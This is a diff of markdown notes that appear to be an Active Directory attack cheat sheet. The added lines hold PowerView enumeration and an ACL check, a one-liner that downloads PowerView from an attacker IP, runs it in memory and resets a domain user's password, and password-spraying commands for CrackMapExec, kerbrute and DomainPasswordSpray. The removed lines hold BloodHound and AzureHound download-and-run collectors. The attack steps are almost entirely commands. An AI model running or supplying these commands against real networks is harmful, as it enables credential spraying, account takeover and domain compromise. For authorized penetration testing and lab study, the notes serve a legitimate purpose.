@@ -213,34 +213,46 @@ Get-NetSession -ComputerName dc01
 
 ```
 
+* enumerating shares
+
+`Get-NetShare`
+
+* Identifying privileges
+
+```powershell
+
+# what kind of permissions does a user within domain have
+Get-NetEffectivePermissions -Identity <username> -Domain <domain_name> -ObjectName <object_name>
+# omit object name to see permissions for all objects
+
+#find computers where local user has admin access
+
+`Find-LocalAdminAccess `
+
+# get exact permission type for some identity
+
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+```
+
+* change domain user password if you got permissions for that
+
+```powershell
+$UserPassword = ConvertTo-SecureString 'Password1' -AsPlainText -Force
+
+#user powerview for that 
+IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx/PowerView.ps1'); Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword
+```
+
 ### Bloodhound
 
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 
-1. Get Sharphound on target host to collect data for Bloodhound
-```
-iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")
-
-Collecting your data set with AzureHound:
-
-PS C:\> Import-Module Az
-PS C:\> Import-Module AzureADPreview
-PS C:\> Connect-AzureAD
-PS C:\> Connect-AzAccount
-PS C:\> . .\AzureHound.ps1
-PS C:\> Invoke-AzureHound
-```
-
-alternative oneliner
+Get Sharphound on target host to collect data for Bloodhound
 
 `IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1') ; Invoke-BloodHound`
 
-2. Invoke Bloodhound on target host and harvest data
-`invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`
-
-OR
-
-use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
+Remote invokation:
 
 `./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
 
@@ -300,16 +312,22 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 * obtain user names with any technique listed above or dumping from somewhere
 
 #### Remote
-* use crackmap remotely
-`cme smb bamdc1.skorp.com -u users_enum.txt -p Password1 | grep '+'`
 
-#### Local
+* SMB
+
+`cme smb bamdc1.skorp.com -u users_enum.txt -p Password1 --continue-on-success | grep '+'`
+
+* TGT
+
+`kerbrute passwordspray -d corp.com --dc 192.168.239.70 users_spray.txt "Nexus123\!"`
+
+#### Local: LDAP/ADSI
 
 * download script and invoke spray
 
 ``` powershell 
 
-IEX(New-Object Net.WebClient).DownloadString('http://192.168.219.141/DomainPasswordSpray.ps1') ; Invoke-DomainPasswordSpray -Password Password1
+IEX(New-Object Net.WebClient).downloadString('http://192.168.45.239/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password "Nexus123!" -UserList users.txt -Domain corp.com
 
 ```
 
